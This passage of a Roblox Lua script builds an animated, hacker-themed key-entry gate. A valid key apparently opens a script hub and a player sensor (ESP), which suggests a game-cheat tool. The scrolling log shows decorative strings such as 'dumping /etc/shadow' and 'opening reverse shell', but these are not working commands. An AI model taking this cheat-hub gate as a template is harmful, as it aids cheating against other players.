        consolePanel.CanCollide = false
        consolePanel.CastShadow = false
        consolePanel.Material = Enum.Material.Neon
        consolePanel.Color = Color3.fromRGB(0, 0, 0)
        consolePanel.Transparency = 1
        consolePanel.Parent = scanWorld
        local consoleFrame = Instance.new("Part")
        consoleFrame.Size = Vector3.new(1.2, 0.8, 0.05)
        consoleFrame.Anchored = true
        consoleFrame.CanCollide = false
        consoleFrame.CastShadow = false
        consoleFrame.Material = Enum.Material.Neon
        consoleFrame.Color = MAIN
        consoleFrame.Transparency = 1
        consoleFrame.Parent = scanWorld
        local consoleLines = {}
        for i = 1, 4 do
            local ln = Instance.new("Part")
            ln.Size = Vector3.new(0.9 - i * 0.05, 0.05, 0.02)
            ln.Anchored = true
            ln.CanCollide = false
            ln.CastShadow = false
            ln.Material = Enum.Material.Neon
            ln.Color = ACCENT
            ln.Transparency = 1
            ln.Parent = scanWorld
            table.insert(consoleLines, ln)
        end

        -- Аяғынан от шығатын косметикалық эффект (нағыз ұшу емес, тек көрнекі салют)
        local leftFootPart = dummy:FindFirstChild("LeftFoot") or dummy:FindFirstChild("Left Leg")
        local rightFootPart = dummy:FindFirstChild("RightFoot") or dummy:FindFirstChild("Right Leg")
        local function mkFootFire(fp)
            if not fp then return nil end
            local f = Instance.new("Fire")
            f.Size = 3.2
            f.Heat = 9
            f.Color = MAIN
            f.SecondaryColor = ACCENT
            f.Enabled = false
            f.Parent = fp
            return f
        end
        local fireL = mkFootFire(leftFootPart)
        local fireR = mkFootFire(rightFootPart)

        local t0 = nil
        local WALK0, WALK1, SIT1 = 0.9, 4.1, 5.2

        avatarPoseFn = function(t)
            t0 = t0 or t
            local tt = t - t0
            introClock = tt

            local walking = (tt >= WALK0 and tt < WALK1)
            local walkK = math.clamp((tt - WALK0) / (WALK1 - WALK0), 0, 1)
            local sitK = ease01((tt - WALK1) / (SIT1 - WALK1))
            local amp = walking and 1 or ((tt < WALK0) and 0 or (1 - sitK))
            if tt >= SIT1 then amp = 0 end
            if reactionState then
                -- пароль терілген кезде, интро аяқталмаса да, бірден отырған позаға өтеді
                sitK, amp, walkK = 1, 0, 1
            end

            -- фаза жазулары
            if tt < WALK0 then
                phaseText, phaseColor = "BOOTING SYSTEM...", MAIN
            elseif tt < WALK1 then
                phaseText, phaseColor = "USER DETECTED...", ACCENT
            elseif tt < SIT1 + 0.3 then
                phaseText, phaseColor = "ACCESSING TERMINAL...", ACCENT
            else
                phaseText, phaseColor = "HACKING IN PROGRESS...", ALERT
            end

            local w = tt * 7
            local swing = math.sin(w) * amp
            local x = -9 + 7.6 * walkK
            local y = -0.3 + math.abs(math.sin(w)) * 0.08 * amp
            local z = 0.2
            local heading = math.rad(-90)
            if tt >= WALK1 then
                x = -1.4 + 1.4 * sitK
                z = 0.2 - 0.2 * sitK
                y = -0.3 + 0.4 * sitK + math.sin(sitK * math.pi) * 0.25
                heading = math.rad(-90) + math.rad(90) * sitK
            end

            local typeR = math.sin(t * 14) * math.rad(4) * sitK
            local typeL = math.sin(t * 14 + 2) * math.rad(4) * sitK
            local stand = 1 - sitK

            poses.RightHip = CFrame.Angles(math.rad(35) * swing * stand + math.rad(90) * sitK, 0, 0)
            poses.LeftHip = CFrame.Angles(-math.rad(35) * swing * stand + math.rad(90) * sitK, 0, 0)
            poses.RightKnee = CFrame.Angles(-(math.rad(8) + math.rad(35) * math.max(0, math.cos(w)) * amp) * stand - math.rad(90) * sitK, 0, 0)
            poses.LeftKnee = CFrame.Angles(-(math.rad(8) + math.rad(35) * math.max(0, -math.cos(w)) * amp) * stand - math.rad(90) * sitK, 0, 0)
            poses.RightShoulder = CFrame.Angles(-math.rad(30) * swing * stand + (math.rad(60) + typeR) * sitK, 0, 0)
            poses.LeftShoulder = CFrame.Angles(math.rad(30) * swing * stand + (math.rad(60) + typeL) * sitK, 0, 0)
            poses.RightElbow = CFrame.Angles(math.rad(12) * amp * stand + (math.rad(15) + typeL) * sitK, 0, 0)
            poses.LeftElbow = CFrame.Angles(math.rad(12) * amp * stand + (math.rad(15) + typeR) * sitK, 0, 0)
            poses.Neck = CFrame.Angles(math.rad(-14) * sitK + math.sin(t * 2) * 0.02 * sitK, math.sin(t * 0.8) * 0.12 * sitK, 0)
            poses.Waist = CFrame.Angles(math.rad(6) * sitK, 0, 0)

            -- ===== Кілт қате/дұрыс терілгендегі реакция =====
            -- "wrong": отырған күйінде орындықпен бұрылып, иығынан қарай қарап ескертеді (тұрмайды)
            -- "correct": толық бұрылып, қолын көтеріп сәлемдеседі
            local extraYaw = 0
            local presence = 0
            if reactionState then
                local isWrong = (reactionState == "wrong")
                local maxYaw = isWrong and math.rad(130) or math.rad(180)
                local rt = t - reactionT0
                local turnDur, holdDur = 0.45, isWrong and 1.9 or 1.7
                if rt < 0 then
                    -- әлі басталмаған
                elseif rt < turnDur then
                    local k = ease01(rt / turnDur)
                    extraYaw = -k * maxYaw
                    if isWrong then
                        poses.Waist = poses.Waist * CFrame.Angles(0, -k * math.rad(25), 0)
                    end
                    if k > 0.05 then showReactionSign(
                        isWrong
                            and "! ЖҮЙЕ ҚАТЕ БЕРУДЕ...\n! ӨТІРІК АЙТПА, ДҰРЫС ЖАЗ!"
                            or "✓ МЕНІҢ ЖҮЙЕМЕ ҚОШ КЕЛДІҢ!",
                        isWrong and Color3.fromRGB(255, 70, 70) or Color3.fromRGB(120, 255, 140)
                    ) end
                elseif rt < turnDur + holdDur then
                    extraYaw = -maxYaw
                    local rt2 = rt - turnDur
                    if isWrong then
                        -- отырған күйде иығынан қарай бұрылып ескертеді, тұрмайды
                        poses.Waist = poses.Waist * CFrame.Angles(0, -math.rad(25), 0)
                        poses.Neck = poses.Neck * CFrame.Angles(0, math.sin(rt2 * 14) * math.rad(10), 0)
                        poses.RightShoulder = CFrame.Angles(math.rad(10), 0, math.rad(55) + math.sin(rt2 * 10) * 0.08)
                        poses.RightElbow = CFrame.Angles(math.rad(-10), 0, 0)
                    else
                        local wave = math.sin(rt2 * 9) * 0.5
                        poses.RightShoulder = CFrame.Angles(math.rad(150), 0, math.rad(-20) + wave)
                        poses.RightElbow = CFrame.Angles(math.rad(-25), 0, wave * 0.5)
                        presence = 1
                    end
                elseif rt < turnDur * 2 + holdDur then
                    local k = ease01((rt - turnDur - holdDur) / turnDur)
                    extraYaw = -maxYaw * (1 - k)
                    if isWrong then
                        poses.Waist = poses.Waist * CFrame.Angles(0, -(1 - k) * math.rad(25), 0)
                    else
                        presence = 1 - k
                    end
                else
                    hideReactionSign()
                    reactionState = nil
                end
            end
            heading = heading + extraYaw

            root.CFrame = CFrame.new(x, y, z) * CFrame.Angles(0, heading, 0)
            solve(root, {})

            -- ===== Дұрыс кілт кезіндегі голографиялық консоль + аяғынан от (косметикалық) =====
            local handPart = dummy:FindFirstChild("RightHand") or dummy:FindFirstChild("Right Arm")
            if handPart and presence > 0.01 then
                local handCF = handPart.CFrame * CFrame.new(0, -0.25, -0.55) * CFrame.Angles(math.rad(80), 0, 0)
                consoleFrame.CFrame = handCF
                consolePanel.CFrame = handCF * CFrame.new(0, 0, 0.03)
                for i, ln in ipairs(consoleLines) do
                    ln.CFrame = handCF * CFrame.new(-0.3 + (i - 1) * 0.2, 0.25 - i * 0.14, 0.05)
                end
                local tr = 1 - presence
                consoleFrame.Transparency = tr
                consolePanel.Transparency = math.max(tr, 0.4)
                for _, ln in ipairs(consoleLines) do ln.Transparency = tr end
            else
                consoleFrame.Transparency = 1
                consolePanel.Transparency = 1
                for _, ln in ipairs(consoleLines) do ln.Transparency = 1 end
            end
            local wantFire = presence > 0.95
            if fireL then fireL.Enabled = wantFire end
            if fireR then fireR.Enabled = wantFire end
        end
    end)
    if not ok then
        warn("[CyberGate] avatar error: " .. tostring(err))
        HackSub.Text = "[ AVATAR: " .. tostring(err):sub(1, 30) .. " ]"
    end
end)

-- ===================== RIGHT: KEY PANEL =====================
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(0.4, 0, 0, 20)
StatusLabel.Position = UDim2.new(0.58, 0, 0.17, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "> FIREBASE KEY REQUIRED_"
StatusLabel.TextColor3 = MAIN
StatusLabel.TextSize = 11
StatusLabel.Font = Enum.Font.Code
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.ZIndex = 5
StatusLabel.Parent = MainFrame

local NetLabel = Instance.new("TextLabel")
NetLabel.Size = UDim2.new(0.39, 0, 0, 14)
NetLabel.Position = UDim2.new(0.58, 0, 0, 34)
NetLabel.BackgroundTransparency = 1
NetLabel.TextColor3 = ACCENT
NetLabel.TextSize = 10
NetLabel.Font = Enum.Font.Code
NetLabel.TextXAlignment = Enum.TextXAlignment.Left
NetLabel.ZIndex = 5
NetLabel.Text = ""
NetLabel.Parent = MainFrame

local function randHex(n)
    local h = ""
    for _ = 1, n do h = h .. string.format("%x", math.random(0, 15)) end
    return h
end
task.spawn(function()
    while alive() do
        local ip = string.format("%d.%d.%d.%d:%d", math.random(10, 240), math.random(0, 255), math.random(0, 255), math.random(1, 254), math.random(1024, 65000))
        NetLabel.Text = "NODE " .. ip .. " | PING " .. math.random(8, 220) .. "ms | HASH " .. randHex(8)
        task.wait(0.8)
    end
end)

local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(0.39, 0, 0, 40)
KeyInput.Position = UDim2.new(0.58, 0, 0.27, 0)
KeyInput.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
KeyInput.BackgroundTransparency = 0.15
KeyInput.TextColor3 = MAIN
KeyInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
KeyInput.PlaceholderText = "Базадағы кілтті жаз..."
KeyInput.Text = ""
KeyInput.TextSize = 13
KeyInput.Font = Enum.Font.Code
KeyInput.ClearTextOnFocus = false
KeyInput.ZIndex = 5
KeyInput.Parent = MainFrame
Instance.new("UICorner", KeyInput).CornerRadius = UDim.new(0, 6)
local kStroke = Instance.new("UIStroke")
kStroke.Color = MAIN
kStroke.Thickness = 1.4
kStroke.Parent = KeyInput

local UnlockBtn = Instance.new("TextButton")
UnlockBtn.Size = UDim2.new(0.39, 0, 0, 40)
UnlockBtn.Position = UDim2.new(0.58, 0, 0.44, 0)
UnlockBtn.BackgroundColor3 = ACCENT
UnlockBtn.BackgroundTransparency = 0.1
UnlockBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
UnlockBtn.Text = "UNLOCK // КІРУ"
UnlockBtn.TextSize = 14
UnlockBtn.Font = Enum.Font.Code
UnlockBtn.ZIndex = 5
UnlockBtn.Parent = MainFrame
Instance.new("UICorner", UnlockBtn).CornerRadius = UDim.new(0, 6)
local uStroke = Instance.new("UIStroke")
uStroke.Color = MAIN
uStroke.Thickness = 1.2
uStroke.Parent = UnlockBtn

-- Terminal log
local LogLabel = Instance.new("TextLabel")
LogLabel.Size = UDim2.new(0.39, 0, 0.34, 0)
LogLabel.Position = UDim2.new(0.58, 0, 0.63, 0)
LogLabel.BackgroundColor3 = Color3.fromRGB(3, 3, 3)
LogLabel.BackgroundTransparency = 0.2
LogLabel.TextColor3 = GREEN
LogLabel.TextSize = 10
LogLabel.Font = Enum.Font.Code
LogLabel.TextXAlignment = Enum.TextXAlignment.Left
LogLabel.TextYAlignment = Enum.TextYAlignment.Bottom
LogLabel.ZIndex = 5
LogLabel.Text = ""
LogLabel.Parent = MainFrame
Instance.new("UICorner", LogLabel).CornerRadius = UDim.new(0, 6)

local logLines = {
    "[+] bypassing firewall...", "[+] injecting payload...",
    "[!] trace detected, rerouting", "[+] rerouting proxy 7/9", "[+] root access: pending",
    "[+] dumping /etc/shadow", "[+] spoofing MAC address", "[+] brute-forcing SSH port 22",
    "[+] exploiting CVE-2024-" .. math.random(1000, 9999), "[+] opening reverse shell",
    "[+] scanning subnet 10.0." .. math.random(0, 255) .. ".0/24",
    "[+] handshake captured (WPA2)", "[+] privilege escalation: ok",
}
task.spawn(function()
    local buf = {}
    while alive() do
        local line = logLines[math.random(1, #logLines)]
        if line:find("decrypting") == nil and math.random() > 0.6 then
            line = "[+] decrypting hash " .. randHex(16)
        end
        table.insert(buf, line)
        if #buf > 5 then table.remove(buf, 1) end
        LogLabel.Text = table.concat(buf, "\n")
        task.wait(0.45)
    end
end)

-- ===================== RESIZE =====================
local ResizeBtn = Instance.new("TextButton")
ResizeBtn.Size = UDim2.new(0, 18, 0, 18)
ResizeBtn.Position = UDim2.new(1, -18, 1, -18)
ResizeBtn.BackgroundColor3 = MAIN
ResizeBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
ResizeBtn.Text = "↘"
ResizeBtn.TextSize = 12
ResizeBtn.Font = Enum.Font.Code
ResizeBtn.ZIndex = 9
ResizeBtn.Parent = MainFrame
Instance.new("UICorner", ResizeBtn).CornerRadius = UDim.new(0, 4)

local isResizing = false
local startInput, startSize
ResizeBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isResizing = true
        startInput = input.Position
        startSize = MainFrame.Size
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if isResizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - startInput
        MainFrame.Size = UDim2.new(0, math.max(440, startSize.X.Offset + delta.X), 0, math.max(260, startSize.Y.Offset + delta.Y))
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isResizing = false
    end
end)

-- ===================== UNLOCK LOGIC (өзгеріссіз) =====================
UnlockBtn.MouseButton1Click:Connect(function()
    UnlockBtn.Text = "CHECKING..."
    local valid, statusText = validateKey(KeyInput.Text)
    StatusLabel.Text = "> " .. statusText

    if valid then
        StatusLabel.TextColor3 = GREEN
        UnlockBtn.Text = "ACCESS GRANTED!"
        UnlockBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        triggerReaction("correct", poseTime)
        task.wait(2.7)
        gateOpen = true
        HackText.Text = "ACCESS GRANTED"
        HackText.TextColor3 = GREEN
        task.wait(0.4)
        GateGui:Destroy()
        if registerUser then registerUser() end
        -- Пароль дұрыс болған соң БІРІНШІ болып SCRIPT HUB терезесі шығады (терминал/ESP бірінші шықпайды).
        local okH, errH = pcall(buildScriptsWindow)
        if not okH then warn("[ScriptHub] " .. tostring(errH)) end
        local okS, errS = pcall(startPlayerSensor)
        if not okS then warn("[Sensor] " .. tostring(errS)) end
        -- Admin панелі енді бөлек скрипт (X-Gemini-admin.lua) арқылы басқарылады.
    else
        StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
        UnlockBtn.Text = "DENIED!"
        UnlockBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        triggerReaction("wrong", poseTime)
        task.wait(2.7)
        UnlockBtn.Text = "UNLOCK // КІРУ"
        UnlockBtn.BackgroundColor3 = ACCENT
    end
end)

end

local okGate, errGate = pcall(buildGate)
if not okGate then
    warn("[CyberGate] FATAL: " .. tostring(errGate))
    pcall(function()
        local eg = Instance.new("ScreenGui")
        eg.Name = "NurlykhanCyberGateError"
        eg.ResetOnSpawn = false
        eg.DisplayOrder = 999
        attachGui(eg)
        local l = Instance.new("TextLabel")
        l.Size = UDim2.new(0, 520, 0, 90)
        l.Position = UDim2.new(0.5, -260, 0.1, 0)
        l.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        l.TextColor3 = Color3.fromRGB(255, 255, 255)
        l.TextWrapped = true
        l.TextSize = 14
        l.Font = Enum.Font.Code
        l.Text = "GATE ERROR: " .. tostring(errGate)
        l.Parent = eg
    end)
end
